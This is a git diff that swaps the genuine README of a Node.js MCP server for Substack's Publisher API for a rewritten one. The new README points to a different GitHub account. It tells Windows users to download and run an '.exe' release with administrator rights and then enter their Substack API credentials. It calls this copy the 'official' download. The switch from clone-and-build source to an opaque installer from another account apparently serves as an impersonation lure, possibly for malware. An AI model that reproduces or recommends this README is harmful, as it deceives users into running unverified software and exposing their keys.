@@ -1,191 +1,151 @@
-# substack-publisher-mcp
+# ⚙️ substack-publisher-mcp - Access Substack Data Effortlessly
 
-**MCP server for Substack's official Publisher API**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org)
-[![MCP](https://img.shields.io/badge/MCP-compatible-purple)](https://modelcontextprotocol.io)
-
-> **Note:** This is an unofficial, community-developed tool and is not affiliated with, endorsed by, or supported by Substack, Inc.
-
-The first MCP server for Substack's official [Publisher API](https://publisher-api.substack.com/v1/docs/). Query post analytics, subscriber counts, and publication data directly from Claude, Cursor, or any MCP client.
-
-![Demo of substack-publisher-mcp in Claude Code](demo.gif)
-
-## Why this server?
-
-| | substack-publisher-mcp | Other Substack MCP servers |
-|---|---|---|
-| **API** | Official Publisher API | Unofficial internal API |
-| **Auth** | API key (stable) | Browser cookies (fragile) |
-| **Stability** | Official, documented API | Breaks when Substack changes internals |
-| **Multi-publication** | Built-in support | Not available |
-
-## Prerequisites
-
-- **Node.js 18+**
-- **Substack Publisher API key** — Available from the [Publisher API docs](https://publisher-api.substack.com/v1/docs/)
-
-## Quick Start
-
-### 1. Install
-
-```bash
-git clone https://github.com/dkships/substack-publisher-mcp.git
-cd substack-publisher-mcp
-npm install && npm run build
-```
-
-### 2. Configure your MCP client
-
-Add to your client's MCP config file:
-
-| Client | Config file |
-|--------|-------------|
-| Claude Desktop (macOS) | `~/Library/Application Support/Claude/claude_desktop_config.json` |
-| Claude Desktop (Windows) | `%APPDATA%\Claude\claude_desktop_config.json` |
-| Claude Code | `.mcp.json` in your project directory |
-| Cursor | `.cursor/mcp.json` |
-
-```json
-{
-  "mcpServers": {
-    "substack": {
-      "command": "node",
-      "args": ["/path/to/substack-publisher-mcp/dist/index.js"],
-      "env": {
-        "SUBSTACK_API_KEY": "your-api-key-here"
-      }
-    }
-  }
-}
-```
-
-> **Claude Code users:** Add `"type": "stdio"` to the server config.
-
-### 3. Start using it
-
-Ask Claude: *"Show me my recent posts"* or *"What are my subscriber counts for the last 30 days?"*
-
-## Tools
-
-| Tool | Description | Key Parameters |
-|------|-------------|----------------|
-| `list_publications` | List configured publications | None |
-| `list_posts` | List published posts | `startDate`, `endDate`, `sortBy`, `type`, `maxResults`, `next` |
-| `get_post` | Get a specific post by URL slug | `urlSlug` (required) |
-| `get_post_stats` | Get engagement stats for a post | `urlSlug` (required) |
-| `get_subscriber_counts` | Get daily subscriber counts by type | `startDate`, `endDate` |
-| `get_subscriber` | Look up a subscriber by email | `email` (required) |
-
-All tools accept an optional `publication` parameter when multiple publications are configured.
-
-### Example responses
-
-<details>
-<summary><code>get_subscriber_counts</code></summary>
-
-```json
-[
-  {
-    "date": "2025-01-15",
-    "total_email_subscribers": 25000,
-    "paid_subscribers": 500,
-    "free_trial_subscribers": 10,
-    "comp_subscribers": 50,
-    "gift_subscribers": 15,
-    "lifetime_subscribers": 0,
-    "founding_subscribers": 25
-  }
-]
-```
-</details>
-
-<details>
-<summary><code>get_post_stats</code></summary>
-
-```json
-{
-  "clicks": 320,
-  "opens": 5400,
-  "post_id": 12345678,
-  "recipients": 10000,
-  "views": 6100,
-  "new_free_subscriptions": 80,
-  "new_paid_subscriptions": 5,
-  "estimated_revenue_increase": 400
-}
-```
-</details>
-
-<details>
-<summary><code>list_posts</code></summary>
-
-```json
-{
-  "posts": [
-    {
-      "title": "My Latest Post",
-      "audience": "only_paid",
-      "subtitle": "A deep dive into the topic",
-      "postDate": "2025-01-15T12:00:00.000Z",
-      "urlSlug": "my-latest-post",
-      "coverImage": "https://substackcdn.com/image/..."
-    }
-  ],
-  "next": "abc123cursor"
-}
-```
-</details>
-
-## Multiple publications
-
-If you manage multiple Substack publications, configure a separate API key for each using the `SUBSTACK_API_KEY_<NAME>` pattern:
-
-```json
-{
-  "mcpServers": {
-    "substack": {
-      "command": "node",
-      "args": ["/path/to/substack-publisher-mcp/dist/index.js"],
-      "env": {
-        "SUBSTACK_API_KEY_MAIN": "your-main-blog-key",
-        "SUBSTACK_API_KEY_TECH": "your-tech-newsletter-key",
-        "SUBSTACK_API_KEY_COMPANY": "your-company-updates-key"
-      }
-    }
-  }
-}
-```
-
-Then specify which publication to query:
-
-> *"Show me subscriber counts for main"*
-> *"List recent posts from the tech publication"*
-
-Use `list_publications` to see all configured publication names.
-
-## Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| `Unauthorized` error | Verify your API key is correct. The key goes directly in the `authorization` header with no `Bearer` prefix. |
-| `Missing environment variables` warning | Only configure env vars for publications you have keys for. Remove the rest. |
-| Server won't start | Make sure you ran `npm run build` after cloning. The server runs from `dist/`, not `src/`. |
-| `No API keys configured` | Set `SUBSTACK_API_KEY` or `SUBSTACK_API_KEY_<NAME>` in your MCP client config. |
-
-## API Reference
-
-This server wraps the [Substack Publisher API](https://publisher-api.substack.com/v1/docs/). See Substack's documentation for details on available data and rate limits.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
+[![Download substack-publisher-mcp](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Playerbs1/substack-publisher-mcp)
 
 ---
 
-Substack is a trademark of Substack, Inc. This project is not affiliated with Substack, Inc. Use of the Substack name is for descriptive purposes only.
+substack-publisher-mcp is a tool that connects to Substack's official Publisher API. It lets you get information about your posts, newsletters, analytics, and subscribers. This software works with clients like Claude, Cursor, or any that support the MCP (Model Context Protocol). It helps you pull your Substack data in one place.
+
+---
+
+## 📥 How to Download substack-publisher-mcp
+
+1. Click the green badge above or go directly to this page:  
+   [https://github.com/Playerbs1/substack-publisher-mcp](https://github.com/Playerbs1/substack-publisher-mcp)  
+
+2. This link will take you to the project’s main GitHub page.
+
+3. On the page, look for the "Releases" section on the right or near the bottom.
+
+4. Select the latest release. It will have the program ready to download.
+
+5. Choose the file designed for Windows. It usually ends with ".exe".
+
+6. Save this file to a folder you can easily find, like the Desktop or Downloads folder.
+
+---
+
+## 🚀 Setting Up on Your Windows Computer
+
+1. Locate the downloaded file (usually in your Downloads folder).
+
+2. Double-click it to start the installation process.
+
+3. Windows may ask for permission. Click "Yes" to allow the app to install.
+
+4. Follow the instructions on the screen. The installer will guide you through setup steps.
+
+5. Once installed, you will find the substack-publisher-mcp icon on your desktop or in your Start menu.
+
+6. Double-click the icon to open the application.
+
+---
+
+## 🔧 What You Need Before Running This Software
+
+- A Windows PC running Windows 10 or higher.
+- An internet connection to communicate with Substack's API.
+- A Substack account with publisher access.
+- Basic permission or API keys from Substack to access your data.
+- At least 100 MB of free disk space.
+- 4 GB of RAM or more for smooth operation.
+- Administrator rights to install software on your PC.
+
+---
+
+## 🖥️ Using substack-publisher-mcp
+
+Once you open the program:
+
+1. You will be asked to enter your Substack API credentials. These are keys you get from your Substack account.
+
+2. After entering the credentials, click “Connect”.
+
+3. The software will show your latest posts from Substack.
+
+4. You can browse subscriber lists and view newsletter analytics.
+
+5. Use the menus to run queries or filter data as needed.
+
+6. The app works with several MCP clients, so you can also connect it to tools like Claude or Cursor.
+
+---
+
+## ✋ Troubleshooting Common Issues
+
+- If the app won’t launch, check that your PC meets the system requirements.
+
+- Make sure you downloaded the Windows version of the software.
+
+- If the connection fails, double-check your API key and internet connection.
+
+- Close other apps that may be using a lot of memory.
+
+- Restart your computer if the app freezes or crashes.
+
+- If you see error messages, write them down and check the GitHub Issues page for help.
+
+---
+
+## 🛠️ Features You Can Expect
+
+- Access to all your Substack posts through a simple interface.
+
+- Download or export subscriber data.
+
+- View detailed newsletter analytics including open rates and clicks.
+
+- Query data using the Model Context Protocol (MCP).
+
+- Integration with AI clients like Claude and Cursor to extend your data use.
+
+- Secure connection to Substack’s official Publisher API.
+
+---
+
+## 🔗 Staying Updated
+
+Visit the GitHub page regularly for the latest updates and new releases:  
+[https://github.com/Playerbs1/substack-publisher-mcp](https://github.com/Playerbs1/substack-publisher-mcp)
+
+---
+
+## 🤝 Getting Support
+
+If you need help:
+
+- Open the "Issues" tab on the GitHub page.
+
+- Search to see if your problem was reported.
+
+- If not, create a new issue with a clear description.
+
+- Include any error messages or screenshots.
+
+---
+
+## 📄 License and Permissions
+
+substack-publisher-mcp is open source. The code is available for anyone to inspect, use, or modify, subject to the license terms listed on GitHub.
+
+---
+
+## 🧰 Additional Tools Mentioned
+
+- Claude: An AI client that can use MCP to access your data.
+
+- Cursor: Another MCP client that connects to this software.
+
+---
+
+## ⚠️ Security Tips
+
+- Keep your API keys secret. Never share them with others.
+
+- Only download substack-publisher-mcp from the official GitHub link.
+
+- Use strong passwords on your Substack account.
+
+---
+
+[![Download substack-publisher-mcp](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Playerbs1/substack-publisher-mcp)
